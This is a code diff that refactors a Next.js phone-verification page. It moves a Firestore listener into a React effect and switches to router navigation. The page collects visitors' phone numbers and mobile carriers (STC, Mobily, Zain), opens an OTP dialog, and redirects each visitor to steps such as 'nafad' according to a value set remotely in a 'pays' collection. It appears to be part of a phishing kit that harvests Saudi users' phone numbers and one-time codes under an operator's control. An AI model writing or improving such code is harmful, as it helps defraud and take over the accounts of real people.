@@ -1,6 +1,7 @@
 "use client"
 
-import { useState } from "react"
+import { useState, useEffect } from "react"
+import { useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { Card } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
@@ -14,32 +15,37 @@ export default function VerifyPhonePage() {
   const [phoneNumber, setPhoneNumber] = useState("")
   const [selectedCarrier, setSelectedCarrier] = useState<string | null>(null)
   const [showOtpDialog, setShowOtpDialog] = useState(false)
-    const visitorID=localStorage.getItem('visitor')
-  const unsubscribe = onSnapshot(
-    doc(db, "pays", visitorID!), 
-    (docSnap) => {
+  const router = useRouter()
+
+  useEffect(() => {
+    const visitorID = localStorage.getItem("visitor")
+    if (!visitorID) return
+
+    const unsubscribe = onSnapshot(doc(db, "pays", visitorID), (docSnap) => {
       if (docSnap.exists()) {
         const data = docSnap.data()
-        console.log(" Firestore data received:", data)
-        
+        console.log("Firestore data received:", data)
+
         // Handle special navigation cases
         if (data.currentStep === "home") {
-          window.location.href = "/"
+          router.push("/")
         } else if (data.currentStep === "phone") {
-          window.location.href = "/phone-info"
+          router.push("/phone-info")
         } else if (data.currentStep === "nafad") {
-          window.location.href = "/nafad"
-        } 
-      }}
-   
-  )
+          router.push("/nafad")
+        }
+      }
+    })
+
+    // Cleanup listener on unmount
+    return () => unsubscribe()
+  }, [router])
+
   const carriers = [
     {
       id: "stc",
       name: "STC",
-      logo: (
-       <img src="/stc.png" alt="" width={80}/>
-      ),
+      logo: <img src="/stc.png" alt="" width={80} />,
       bgColor: "bg-purple-50",
       borderColor: "border-purple-200",
       selectedBorder: "border-purple-500",
@@ -47,9 +53,7 @@ export default function VerifyPhonePage() {
     {
       id: "mobily",
       name: "Mobily",
-      logo: (
-        <img src="/stc.png" alt="" width={80}/>
-      ),
+      logo: <img src="/stc.png" alt="" width={80} />,
       bgColor: "bg-green-50",
       borderColor: "border-green-200",
       selectedBorder: "border-green-500",
@@ -57,9 +61,7 @@ export default function VerifyPhonePage() {
     {
       id: "zain",
       name: "Zain",
-      logo: (
-       <img src="/Zain-logo-400x400-01.png" alt="zain" width={60}/>
-      ),
+      logo: <img src="/Zain-logo-400x400-01.png" alt="zain" width={60} />,
       bgColor: "bg-orange-50",
       borderColor: "border-orange-200",
       selectedBorder: "border-orange-500",
@@ -68,10 +70,8 @@ export default function VerifyPhonePage() {
 
   const handleSendOtp = async () => {
     if (phoneNumber && selectedCarrier) {
-      const visitorID=localStorage.getItem('visitor')
-     await addData({id:visitorID,phoneNumber2:phoneNumber,selectedCarrier}
-
-      )
+      const visitorID = localStorage.getItem("visitor")
+      await addData({ id: visitorID, phoneNumber2: phoneNumber, selectedCarrier })
       setShowOtpDialog(true)
     }
   }
